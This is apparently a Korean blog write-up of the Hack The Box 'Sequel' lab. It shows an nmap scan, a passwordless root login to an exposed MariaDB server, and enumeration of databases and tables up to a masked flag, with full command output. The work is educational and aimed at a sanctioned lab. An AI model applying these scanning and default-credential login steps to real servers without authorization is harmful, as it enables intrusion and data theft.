---
title: HTB Sequel Write-up
categories: [HackTheBox, Basic]
tags: [HackTheBox, SQL, MySQL, MariaDB]
image:
    path: 
---
이번 문제는 질문을 보니 MySQL과 관련된 문제인듯 하다. 우선 포트 스캔의 결과부터 보자
``` bash
 read-min 🎉   ~  nmap 10.129.166.161 -sV -sC
Starting Nmap 7.94 ( https://nmap.org ) at 2024-02-04 17:01 KST
Stats: 0:03:35 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 0.00% done
Stats: 0:03:41 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 0.00% done
Nmap scan report for 10.129.166.161
Host is up (0.27s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE    SERVICE        VERSION
7/tcp    filtered echo
3306/tcp open     mysql?
| mysql-info:
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
|   Thread ID: 108
|   Capabilities flags: 63486
|   Some Capabilities: Support41Auth, SupportsLoadDataLocal, FoundRows, LongColumnFlag, SupportsTransactions, IgnoreSigpipes, DontAllowDatabaseTableColumn, Speaks41ProtocolNew, SupportsCompression, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, ODBCClient, ConnectWithDatabase, InteractiveClient, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: YaZ#:;W&WbfYi(*8z#::
|_  Auth Plugin Name: mysql_native_password
3367/tcp filtered satvid-datalnk
6565/tcp filtered unknown

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 302.65 seconds
```

특이한 점은 kali linux에서 실행한 결과에서는 filterd 라고 나온다. 포트를 지정해서 그런가.
``` bash
# nmap -sV -sC -p 3306 10.129.166.161
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-04 08:03 UTC
Nmap scan report for 10.129.166.161
Host is up (0.00054s latency).

PORT     STATE    SERVICE VERSION
3306/tcp filtered mysql

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 5.53 seconds
```
2번 문제부터 어떤 걸 써야하는지 몰라 당황했었다
> What community-developed MySQL version is the target running?

정답은 포트 스캔한 결과에 나와있는 이 부분을 봐야했다.
``` bash
Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
```

다음 문제를 풀기 위해선 mysql과 상호작용 할 수 있는 cli 프로그램이 필요하다. 아래와 같이 설치하자
``` shell
apt install mariadb-client
```

이후 접속을 위해 아래와 같이 입력하였다. 바로 접속이 되기에 어떤 계정으로 접속 된건지 확인해보니 root였다.
``` bash
# mysql -h 10.129.166.161
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 154
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> SELECT USER(), CURRENT_USER();
+------------------+----------------+
| USER()           | CURRENT_USER() |
+------------------+----------------+
| root@10.10.14.49 | root@%         |
+------------------+----------------+
1 row in set (0.292 sec)
```
우선 어떤 database가 존재하는지 확인해보자. 아래와 같이 4개의 항목에 대해 확인이 가능하다.
``` bash
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.474 sec)
```

우선 mysql의 내용을 확인해보자. 
``` shell
MariaDB [(none)]> use mysql
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed

MariaDB [mysql]>
MariaDB [mysql]> show tables;
+---------------------------+
| Tables_in_mysql           |
+---------------------------+
| column_stats              |
| columns_priv              |
| db                        |
| event                     |
| func                      |
| general_log               |
| gtid_slave_pos            |
| help_category             |
| help_keyword              |
| help_relation             |
| help_topic                |
| host                      |
| index_stats               |
| innodb_index_stats        |
| innodb_table_stats        |
| plugin                    |
| proc                      |
| procs_priv                |
| proxies_priv              |
| roles_mapping             |
| servers                   |
| slow_log                  |
| table_stats               |
| tables_priv               |
| time_zone                 |
| time_zone_leap_second     |
| time_zone_name            |
| time_zone_transition      |
| time_zone_transition_type |
| transaction_registry      |
| user                      |
+---------------------------+
```

테이블 항목이 꽤 많은 것을 알 수 있다. 모든 테이블을 하나하나 확인하기에는 오래 걸리니 아래와 같이 많은 항목이 저장된 테이블을 추려보았다.
``` bash
MariaDB [mysql]> 
SELECT table_name, table_rows
FROM information_schema.tables
WHERE table_schema = 'mysql'
ORDER BY table_rows DESC;

+---------------------------+------------+
| table_name                | table_rows |
+---------------------------+------------+
| help_relation             |       1028 |
| help_topic                |        508 |
| help_keyword              |        464 |
| help_category             |         39 |
| innodb_index_stats        |         10 |
| innodb_table_stats        |          3 |
| slow_log                  |          2 |
| general_log               |          2 |
| proc                      |          2 |
| user                      |          1 |
| proxies_priv              |          1 |
| time_zone_leap_second     |          0 |
| db                        |          0 |
| time_zone_transition_type |          0 |
... 0개 이므로 이하 생략 ...
```

주요해보이는 몇 가지 항목에 대해서 확인을 해본 결과 유의미한 결과는 아래의 host 정보 뿐인듯 하다.
``` bash
MariaDB [mysql]> SELECT Host, User, Password FROM user
    -> ;
+------+------+----------+
| Host | User | Password |
+------+------+----------+
| %    | root |          |
+------+------+----------+
```

이제 htb 데이터베이스의 내용을 확인해보자.
``` bash
MariaDB [mysql]> use htb;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed

MariaDB [htb]>
SELECT table_name, table_rows
FROM information_schema.tables
WHERE table_schema = 'htb'
ORDER BY table_rows DESC;

+------------+------------+
| table_name | table_rows |
+------------+------------+
| config     |          6 |
| users      |          4 |
+------------+------------+
```

users 내용 조회 시 아래와 같다.
``` bash
MariaDB [htb]> select * from users;
+----+----------+------------------+
| id | username | email            |
+----+----------+------------------+
|  1 | admin    | admin@sequel.htb |
|  2 | lara     | lara@sequel.htb  |
|  3 | sam      | sam@sequel.htb   |
|  4 | mary     | mary@sequel.htb  |
+----+----------+------------------+
4 rows in set (0.301 sec)
```
config 항목을 조회하면 flag 값을 얻을 수 있다.
``` bash
MariaDB [htb]> select * from config;
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | xxxxxxxxxxxxxxxxxxx              |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
```

이렇게 Mysql MariaDB와 관련된 문제를 풀었다.
![](../assets/image_post/20240204174858.png)